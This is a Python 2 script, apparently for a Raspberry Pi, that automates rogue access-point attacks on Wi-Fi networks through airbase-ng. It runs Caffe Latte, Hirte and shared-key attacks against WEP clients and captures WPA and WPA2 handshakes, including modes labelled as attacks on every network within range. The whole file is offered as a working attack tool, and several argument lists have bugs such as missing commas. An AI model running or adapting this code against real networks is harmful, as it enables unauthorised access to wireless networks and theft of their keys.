import os
import time
import sys
from subprocess import Popen, call, PIPE

args = sys.argv[1:]
waitTime = 30
essid = ""
channel=""

if os.geteuid() != 0: 
    print ""
    sys.exit('Sorry but this script needs root permissions to run.')
    

def help():
	print ""
	
	print "Usage: "
	print "-waitTime: Specify the wait time in seconds that we should take for each actual exploitation step."
	print "-essid: Specify the essid that we want to exploit."
	print "-wep-airbase: Attack a single WEP encrypted network. Requires the essid to attack to be supplied."
	print "-wpa-airbase: Attack a single WPA encrypted network. Requires the essid to attack to be supplied."
	print "-wpa2-airbase: Attack a single WPA2 encrypted network. Requires the essid to attack to be supplied."
	print ""
	print "EXPERIMENTAL THINGS:"
	print "-wpa2All-airbase: Attack all WPA2 encrypted networks within range of the pi. Currently experimental...."
	print "-wpaAll-airbase: Attack all WP2 encrypted networks within range of the pi. Currently experimental...."
	print ""
	print "Example: "
	print "./program -waitTime=300 -essid=test -channel=11 -wep-airbase"	
	print ""

def startMon():
	print ""
	print "The following monitor interfaces exist on wlan0: "
	result = os.system("ifconfig | grep mon0 | cut -d ' ' -f 1")
	print ""
	if result == "mon0":
		os.system("sudo airmon-ng start wlan0")
	else:
		print "mon0 interface already started..."

# If no arguments supplied or --help or -h is supplied to the program, print out the help menu.

try:
	if args[0] == "--help" or args[0] == "-h" or args[0] == "":
		help()
except:
	# In case no arguments are supplied we will trigger an exception.
	help()
		

# Loop for any args that need defining before we start doing the actual exploiting.
for x in args:
    if x[:9] == "-waitTime":
        waitTime = int(x[10:])
    
    if x[:6] == "-essid":
       essid = x[7:]
       print "The essid is: " + essid

    if x[:8] == "-channel":
	channel = x[9:]

for x in args:
    
    if x == "-wep-airbase":

	# If no channel specified then exit the program
	if channel == "":
		print channel
		print "Please specify a channel"
		exit(1)
        
	# If no ESSID was specified then exit the program.
	if essid == "":
    		print "Please specify the essid with -essid='name here'\r\n"
    		exit(1)
	
	# Start up the monitor mode
	startMon()
        
        # Execute Caffe Late attack
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel,
                         "-e", 
                         essid, 
                         "-L",
                         "-W",
                         "1",
                         "-P",
                         "-C",
			 "10",
			 "-F", 
			 "caffeLate",
                         "mon0"], stdout=0)
                         
        print "\r\nStarting Caffe Late attack. This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
                           
            
        handler.kill()
        
        
        
        # Execute Hirte attack in Ad-Hoc Mode
       
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel,
                         "-e", 
                         essid, 
                         "-N",
                         "-W",
                         "-A"
                         "1",
                         "-P",
                         "-C", 
			 "10",
                         "mon0"], stdout=0)
                         
        print "\r\nStarting Hirte Attack (Ad-Hoc Mode). This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
                           
            
        handler.kill()
        
       
       
         # Execute Hirte attack in Access Point Mode
       
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel,
                         "-e", 
                         essid, 
                         "-N",
                         "-W",
                         "1",
                         "-P",
                         "-C", 
			 "10",
                         "mon0"], stdout=0)
                         
        print "\r\nStarting Hirte Attack (Access Point Mode). This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
                           
            
        handler.kill()
        
        
         
         # Execute Shared Key Attack
                
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel,
                         "-e", 
                         essid, 
                         "-s",
                         "-W",
                         "1",
                         "-F",
                         "share",
                         "-P",
                         "-C 10",
                         "mon0"], stdout=0)
                         
        print "\r\nStarting Shared Key Attack. This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
                           
            
        handler.kill()

    
    if x == "-wpaAll-airbase":
	
	# Start up the monitor mode
	startMon()
    
        # WPA Handshake Capture (against all avalible ESSID's)
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel, 
                         "-z",
                         "2",
                         "-W",
                         "1",
                         "-F",
                         "wpaTKIP"
                         "-P",
                         "-C 10",
                         "mon0"], stdout=0)
                         
        print "\r\nStarting WPA (ALL) Handshake Capture. This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
                
        
        
    if x == "-wpa2All-airbase":
	# Start up the monitor mode
	startMon()
        
	# WPA2  Handshake Capture (against all avalible ESSID's)
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel, 
                         "-Z",
                         "4",
                         "-W",
                         "1",
                         "-F",
                         "wpa2Handshake",
                         "-P",
                         "-C 10",
                         "mon0"], stdout=0)
                         
        print "\r\nStarting WPA2 (ALL) Handshake Capture. This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
                           
            
        handler.kill()
     
     
     
    if x == "-wpa-airbase":

	# If no channel specified then exit the program
	if channel == "":
		print "Please specify a channel"
		exit(1)

	# If no ESSID was specified then exit the program.
	if essid == "":
    		print "Please specify the essid with -essid='name here'\r\n"
   		exit(1)

	# Start up the monitor mode
	startMon()
    
        # WPA Handshake Capture
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel, 
                         "-z",
                         "2",
                         "-W",
                         "1",
                         "-F",
                         essid + "Handshake",
                         "-e",
                         essid,
                         "mon0"], stdout=0)
                         
        print "\r\nStarting WPA Handshake Capture. This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
    
       
       	handler.kill()
       
       
    if x == "-wpa2-airbase":

	# If no channel specified then exit the program
	if channel == "":
		print "Please specify a channel"
		exit(1)
	
	# If no ESSID was specified then exit the program.
	if essid == "":
    		print "Please specify the essid with -essid='name here'\r\n"
    		exit(1)

	# Start up the monitor mode
	startMon()

        # WPA2  Handshake Capture (against all avalible ESSID's)
        handler = Popen(["airbase-ng", 
                         "-c", 
                         channel, 
                         "-Z",
                         "4",
                         "-W",
                         "1",
                         "-F",
                         essid + "Handshake",
                         "-e",
                         essid,
                         "mon0"], stdout=0)
                         
        print "\r\nStarting WPA2 Handshake Capture. This will take " + str(waitTime) + " seconds to run. \r\n"      
        
        startTime = time.time()        
        while ((time.time() - startTime) < waitTime):
            #just wait
            timeTaken = (time.time() - startTime)
            round(timeTaken)
            if (timeTaken % 30 == 0):
                print "\r\nTime so far: " + str(timeTaken) + " seconds."
                           
            
        handler.kill()  
